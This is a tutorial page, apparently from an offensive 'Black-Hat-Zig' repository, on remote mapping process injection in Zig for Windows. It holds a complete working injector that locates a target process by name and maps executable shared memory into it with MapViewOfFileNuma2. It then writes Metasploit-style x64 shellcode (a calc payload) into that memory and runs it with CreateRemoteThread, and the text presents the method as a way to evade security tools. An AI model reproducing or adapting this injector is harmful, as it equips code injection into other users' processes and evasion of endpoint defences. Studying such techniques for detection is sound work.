# Remote Mapping Injection

## TL;DR

[See the code example](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/src/Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection)

Remote mapping injection is an advanced process injection technique that combines the benefits of mapped memory with cross-process injection capabilities. Unlike traditional injection methods that rely on `VirtualAllocEx` and `WriteProcessMemory`, this technique uses file mapping APIs to create shared memory regions that can be accessed by both the injecting process and the target process.

## Remote Mapping Injection

Remote mapping injection works by creating a file mapping object that can be mapped into multiple processes simultaneously. The technique involves:

1. **Creating a file mapping**: Using `CreateFileMapping` to create a mapping object backed by the paging file
2. **Local mapping**: Mapping the file into the current process's address space for writing
3. **Payload copying**: Writing the shellcode to the locally mapped memory
4. **Remote mapping**: Mapping the same file into the target process's address space with executable permissions
5. **Execution**: Creating a remote thread to execute the shellcode

This approach offers several advantages:

- **Shared memory**: The same physical memory pages are shared between processes
- **Atomic injection**: The payload is written once and becomes immediately available in the target process
- **Memory efficiency**: No need to allocate separate memory in the target process
- **Evasion potential**: Uses legitimate file mapping APIs instead of traditional injection APIs

## MapViewOfFile2

```zig
// Note: This function cannot be used reliably in Zig
extern "kernel32" fn MapViewOfFile2(
    FileMappingHandle: HANDLE,
    ProcessHandle: HANDLE,
    Offset: u64,
    BaseAddress: ?*anyopaque,
    ViewSize: usize,
    AllocationType: u32,
    PageProtection: u32,
) callconv(WINAPI) ?*anyopaque;
```

This function is designed to map a view of a file mapping into a specified process. However, it cannot be used reliably in Zig due to compilation and linking issues. Check [this GitHub issue](https://github.com/ziglang/zig/issues/22040) for more details about the specific problems encountered when attempting to use this function.

The main issues include:

- **Linker errors**: The function may not be properly linked during compilation
- **API availability**: Inconsistent availability across different Windows versions
- **Zig compatibility**: The function signature may not be fully compatible with Zig's FFI system

## MapViewOfFileNuma2

```zig
extern "api-ms-win-core-memory-l1-1-5" fn MapViewOfFileNuma2(
    FileMappingHandle: HANDLE,
    ProcessHandle: HANDLE,
    Offset: u64,
    BaseAddress: ?*anyopaque,
    ViewSize: usize,
    AllocationType: u32,
    PageProtection: u32,
    PreferredNode: u32,
) callconv(windows.WINAPI) ?*anyopaque;
```

`MapViewOfFileNuma2` is the NUMA-aware version of `MapViewOfFile2` and serves as the primary function for remote mapping injection. This function allows mapping a file view into a remote process while specifying NUMA preferences.

**Parameters:**

- `FileMappingHandle`: Handle to the file mapping object
- `ProcessHandle`: Handle to the target process
- `Offset`: Byte offset in the file where mapping begins
- `BaseAddress`: Preferred base address (can be null for system choice)
- `ViewSize`: Size of the mapping (0 for entire file)
- `AllocationType`: Memory allocation type (typically 0)
- `PageProtection`: Memory protection flags (e.g., `PAGE_EXECUTE_READWRITE`)
- `PreferredNode`: NUMA node preference (`NUMA_NO_PREFERRED_NODE` for no preference)

**Key Features:**

- **Cross-process mapping**: Can map memory into remote processes
- **NUMA awareness**: Allows specification of preferred NUMA nodes
- **Flexible permissions**: Can set different memory protection flags
- **System integration**: Part of the Windows API memory management system

## Note

When using `MapViewOfFileNuma2`, several important considerations must be taken into account:

1. **Windows Version Compatibility**: This function is only available on Windows 10 version 1803 (April 2018 Update) and later. Earlier versions of Windows do not support this API.

2. **DLL Dependency**: The function is exported from `api-ms-win-core-memory-l1-1-5.dll`, which may not be available on all systems. Consider implementing fallback mechanisms for older systems.

3. **Permissions**: The target process must have sufficient permissions to allow memory mapping. This typically requires `PROCESS_VM_OPERATION` and `PROCESS_VM_WRITE` access rights.

4. **Memory Alignment**: The function may have specific alignment requirements for the base address and size parameters.

5. **Error Handling**: Always check return values and use `GetLastError()` for detailed error information when the function fails.

## remoteMapInject Function

The core function that implements remote mapping injection:

```zig
fn remoteMapInject(hProcess: HANDLE, pPayload: []const u8, ppAddress: *?PVOID) bool {
    var bState: bool = true;
    var hFile: ?HANDLE = null;
    var pMapLocalAddress: ?PVOID = null;
    var pMapRemoteAddress: ?PVOID = null;

    // Create a file mapping handle with RWX memory permissions
    hFile = CreateFileMappingW(
        INVALID_HANDLE_VALUE,
        null,
        PAGE_EXECUTE_READWRITE,
        0,
        @intCast(pPayload.len),
        null,
    );

    if (hFile == null) {
        print("\t[!] CreateFileMapping Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        return bState;
    }

    // Map the view locally for writing
    pMapLocalAddress = MapViewOfFile(
        hFile.?,
        FILE_MAP_WRITE,
        0,
        0,
        pPayload.len,
    );

    if (pMapLocalAddress == null) {
        print("\t[!] MapViewOfFile Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("\t[+] Local Mapping Address : 0x{X}\n", .{@intFromPtr(pMapLocalAddress.?)});

    // Copy payload to local mapping
    const dest = @as([*]u8, @ptrCast(pMapLocalAddress.?));
    @memcpy(dest[0..pPayload.len], pPayload);

    // Map the same file into the remote process with execute permissions
    pMapRemoteAddress = MapViewOfFileNuma2(
        hFile.?,
        hProcess,
        0,
        null,
        0,
        0,
        PAGE_EXECUTE_READWRITE,
        NUMA_NO_PREFERRED_NODE,
    );

    if (pMapRemoteAddress == null) {
        print("\t[!] MapViewOfFileNuma2 Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("\t[+] Remote Mapping Address : 0x{X}\n", .{@intFromPtr(pMapRemoteAddress.?)});

    ppAddress.* = pMapRemoteAddress;
    if (hFile) |handle| _ = CloseHandle(handle);
    return bState;
}
```

**Process Flow:**

1. **File mapping creation**: Creates a file mapping object backed by the paging file
2. **Local mapping**: Maps the file locally with write permissions for payload copying
3. **Payload writing**: Copies the shellcode to the locally mapped memory
4. **Remote mapping**: Maps the same file into the target process with execute permissions
5. **Address return**: Returns the remote mapping address for thread creation

**Key Advantages:**

- **Shared memory**: Both processes access the same physical memory pages
- **Atomic operation**: Payload becomes available in target process immediately after local write
- **Memory efficiency**: No need for separate allocation and copying in target process
- **Legitimate APIs**: Uses standard Windows memory management APIs

## UnmapViewOfFile

```zig
extern "kernel32" fn UnmapViewOfFile(lpBaseAddress: PVOID) callconv(WINAPI) BOOL;
```

While not used in this specific implementation, `UnmapViewOfFile` is crucial for proper cleanup of mapped memory regions. It unmaps a mapped view of a file from the calling process's address space.

**Usage scenarios:**

- **Cleanup**: Removing mapped memory regions when no longer needed
- **Security**: Preventing memory leaks and unauthorized access
- **Resource management**: Proper handling of system resources

**Example usage:**

```zig
// Clean up local mapping
if (pMapLocalAddress) |addr| {
    if (UnmapViewOfFile(addr) == 0) {
        print("[!] UnmapViewOfFile failed: {}\n", .{windows.kernel32.GetLastError()});
    }
}
```

**Important notes:**

- Must be called from the same process that created the mapping
- Does not affect mappings in other processes
- Should be called before closing the file mapping handle
- Failure to unmap can lead to resource leaks

## Complete Example

```zig name=remote_mapping_injection.zig
const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;
const unicode = std.unicode;

const HANDLE = windows.HANDLE;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const WINAPI = windows.WINAPI;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const PVOID = windows.PVOID;
const SIZE_T = windows.SIZE_T;
const PBYTE = [*]u8;

const CloseHandle = windows.CloseHandle;

// Memory protection constants
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;

// File mapping constants
const FILE_MAP_WRITE: DWORD = 0x2;
const FILE_MAP_EXECUTE: DWORD = 0x20;

// Process access constants
const PROCESS_ALL_ACCESS: DWORD = 0x001F0FFF;

// Toolhelp32 constants
const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
const MAX_PATH: usize = 260;

const NUMA_NO_PREFERRED_NODE: u32 = 0xffffffff;

const PROCESSENTRY32 = extern struct {
    dwSize: windows.DWORD,
    cntUsage: windows.DWORD,
    th32ProcessID: windows.DWORD,
    th32DefaultHeapID: usize,
    th32ModuleID: windows.DWORD,
    cntThreads: windows.DWORD,
    th32ParentProcessID: windows.DWORD,
    pcPriClassBase: i32,
    dwFlags: windows.DWORD,
    szExeFile: [MAX_PATH]u8,
};

// x64 calc metasploit shellcode
const payload = [_]u8{
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
};

// External Windows API functions
extern "kernel32" fn CreateFileMappingW(
    hFile: HANDLE,
    lpFileMappingAttributes: ?*windows.SECURITY_ATTRIBUTES,
    flProtect: DWORD,
    dwMaximumSizeHigh: DWORD,
    dwMaximumSizeLow: DWORD,
    lpName: ?[*:0]const u16,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: HANDLE,
    dwDesiredAccess: DWORD,
    dwFileOffsetHigh: DWORD,
    dwFileOffsetLow: DWORD,
    dwNumberOfBytesToMap: SIZE_T,
) callconv(WINAPI) ?PVOID;

extern "api-ms-win-core-memory-l1-1-5" fn MapViewOfFileNuma2(
    FileMappingHandle: HANDLE,
    ProcessHandle: HANDLE,
    Offset: u64,
    BaseAddress: ?*anyopaque,
    ViewSize: usize,
    AllocationType: u32,
    PageProtection: u32,
    PreferredNode: u32,
) callconv(windows.WINAPI) ?*anyopaque;

extern "kernel32" fn CreateToolhelp32Snapshot(
    dwFlags: DWORD,
    th32ProcessID: DWORD,
) callconv(WINAPI) HANDLE;

extern "kernel32" fn Process32First(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn Process32Next(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: DWORD,
    bInheritHandle: BOOL,
    dwProcessId: DWORD,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn CreateRemoteThread(
    hProcess: HANDLE,
    lpThreadAttributes: ?*windows.SECURITY_ATTRIBUTES,
    dwStackSize: SIZE_T,
    lpStartAddress: PVOID,
    lpParameter: ?PVOID,
    dwCreationFlags: DWORD,
    lpThreadId: ?*DWORD,
) callconv(WINAPI) ?HANDLE;

fn remoteMapInject(hProcess: HANDLE, pPayload: []const u8, ppAddress: *?PVOID) bool {
    var bState: bool = true;
    var hFile: ?HANDLE = null;
    var pMapLocalAddress: ?PVOID = null;
    var pMapRemoteAddress: ?PVOID = null;

    // Create a file mapping handle with RWX memory permissions
    hFile = CreateFileMappingW(
        INVALID_HANDLE_VALUE,
        null,
        PAGE_EXECUTE_READWRITE,
        0,
        @intCast(pPayload.len),
        null,
    );

    if (hFile == null) {
        print("\t[!] CreateFileMapping Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        return bState;
    }

    // Map the view locally for writing
    pMapLocalAddress = MapViewOfFile(
        hFile.?,
        FILE_MAP_WRITE,
        0,
        0,
        pPayload.len,
    );

    if (pMapLocalAddress == null) {
        print("\t[!] MapViewOfFile Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("\t[+] Local Mapping Address : 0x{X}\n", .{@intFromPtr(pMapLocalAddress.?)});

    waitForEnter("\t[#] Press <Enter> To Write The Payload ... ");
    print("\t[i] Copying Payload To 0x{X} ... ", .{@intFromPtr(pMapLocalAddress.?)});

    // Copy payload to mapped memory
    const dest = @as([*]u8, @ptrCast(pMapLocalAddress.?));
    @memcpy(dest[0..pPayload.len], pPayload);

    print("[+] DONE\n", .{});

    // Map the same file into the remote process with execute permissions
    pMapRemoteAddress = MapViewOfFileNuma2(
        hFile.?,
        hProcess,
        0,
        null,
        0,
        0,
        PAGE_EXECUTE_READWRITE,
        NUMA_NO_PREFERRED_NODE,
    );

    if (pMapRemoteAddress == null) {
        print("\t[!] MapViewOfFileNuma2 Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("\t[+] Remote Mapping Address : 0x{X}\n", .{@intFromPtr(pMapRemoteAddress.?)});

    ppAddress.* = pMapRemoteAddress;
    if (hFile) |handle| _ = CloseHandle(handle);
    return bState;
}

fn getRemoteProcessHandle(process_name: []const u16, process_id: *windows.DWORD, process_handle: *?windows.HANDLE) bool {
    // Initialize return values to null
    process_id.* = 0;
    process_handle.* = null;

    // Take a snapshot of currently running processes
    const h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) {
        std.debug.print("\t[!] CreateToolhelp32Snapshot Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        return false;
    }
    defer {
        _ = windows.CloseHandle(h_snapshot);
    }

    // Setup process entry
    var proc = PROCESSENTRY32{
        .dwSize = @sizeOf(PROCESSENTRY32),
        .cntUsage = 0,
        .th32ProcessID = 0,
        .th32DefaultHeapID = 0,
        .th32ModuleID = 0,
        .cntThreads = 0,
        .th32ParentProcessID = 0,
        .pcPriClassBase = 0,
        .dwFlags = 0,
        .szExeFile = undefined,
    };

    // Get first process
    if (Process32First(h_snapshot, &proc) == 0) {
        std.debug.print("\n\t[!] Process32First Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        return false;
    }

    // Loop through processes
    while (true) {
        // Convert process name to lowercase for comparison
        var lower_name: [MAX_PATH * 2]u16 = undefined;
        @memset(&lower_name, 0);

        // Convert proc.szExeFile to wide string and make lowercase for comparison
        var utf16_process_name: [MAX_PATH]u16 = undefined;
        var utf16_length: usize = 0;

        // Convert ANSI to UTF-16
        for (0..MAX_PATH) |i| {
            if (proc.szExeFile[i] == 0) {
                break;
            }
            utf16_process_name[i] = @as(u16, proc.szExeFile[i]);
            utf16_length = i + 1;
        }
        utf16_process_name[utf16_length] = 0; // Null terminate

        // Convert to lowercase
        var i: usize = 0;
        while (i < utf16_length) : (i += 1) {
            const c = utf16_process_name[i];
            if (c >= 'A' and c <= 'Z') {
                lower_name[i] = c + ('a' - 'A');
            } else {
                lower_name[i] = c;
            }
        }
        lower_name[i] = 0; // Null terminate

        // Compare names
        var match = true;
        i = 0;
        while (i < process_name.len and process_name[i] != 0 and i < MAX_PATH * 2) : (i += 1) {
            if (process_name[i] != lower_name[i]) {
                match = false;
                break;
            }
            if (lower_name[i] == 0) break;
        }

        if (match) {
            // We found the process
            process_id.* = proc.th32ProcessID;
            process_handle.* = OpenProcess(PROCESS_ALL_ACCESS, 0, proc.th32ProcessID);

            if (process_handle.* == null) {
                std.debug.print("\n\t[!] OpenProcess Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
            }
            break;
        }

        // Get next process
        if (Process32Next(h_snapshot, &proc) == 0) {
            break;
        }
    }

    return (process_id.* != 0 and process_handle.* != null);
}

fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

pub fn main() !void {
    var allocator = std.heap.page_allocator;
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    var hProcess: ?HANDLE = null;
    var hThread: ?HANDLE = null;
    var pAddress: ?PVOID = null;
    var dwProcessId: DWORD = 0;

    if (args.len < 2) {
        print("[!] Usage : \"{s}\" <Process Name>\n", .{args[0]});
        return;
    }

    // Convert process name to UTF-16
    const processName = try std.unicode.utf8ToUtf16LeAllocZ(allocator, args[1]);
    defer allocator.free(processName);

    // Convert to lowercase for comparison
    var lowerProcessName = try allocator.alloc(u16, processName.len);
    defer allocator.free(lowerProcessName);

    for (processName[0 .. processName.len - 1], 0..) |char, i| {
        lowerProcessName[i] = std.ascii.toLower(@intCast(char));
    }

    print("[i] Searching For Process Id Of \"{s}\" ... ", .{args[1]});
    if (!getRemoteProcessHandle(lowerProcessName[0 .. processName.len - 1], &dwProcessId, &hProcess)) {
        print("[!] Process is Not Found\n", .{});
        return;
    }
    print("[+] DONE\n", .{});
    print("[+] Found Target Process Pid: {}\n", .{dwProcessId});

    print("[i] Injecting Target Process ...\n", .{});
    if (!remoteMapInject(hProcess.?, payload[0..], &pAddress)) {
        print("[!] FAILED\n", .{});
        return;
    }
    print("[+] DONE\n", .{});

    waitForEnter("[#] Press <Enter> To Run The Payload ... ");

    hThread = CreateRemoteThread(
        hProcess.?,
        null,
        0,
        pAddress.?,
        null,
        0,
        null,
    );

    if (hThread == null) {
        print("[!] CreateRemoteThread Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
    }

    waitForEnter("[#] Press <Enter> To Quit ... ");

    // Clean up handles
    if (hThread) |handle| _ = CloseHandle(handle);
    if (hProcess) |handle| _ = CloseHandle(handle);
}
```

## Key Benefits

1. **Shared Memory Architecture**: Uses the same physical memory pages for both processes
2. **Atomic Injection**: Payload becomes available immediately after local write
3. **Memory Efficiency**: No separate allocation in target process required
4. **Evasion Potential**: Uses legitimate Windows memory management APIs
5. **Cross-Process Capability**: Can inject into remote processes with proper permissions

## Limitations

1. **Windows Version Dependency**: Requires Windows 10 version 1803 or later
2. **Permission Requirements**: Needs appropriate process access rights
3. **API Availability**: May not be available on all systems
4. **Detection**: Advanced security solutions may still detect the technique
5. **Complexity**: More complex than traditional injection methods

Remote mapping injection represents an advanced technique that leverages Windows' memory management architecture to achieve cross-process code injection while potentially evading some security controls.
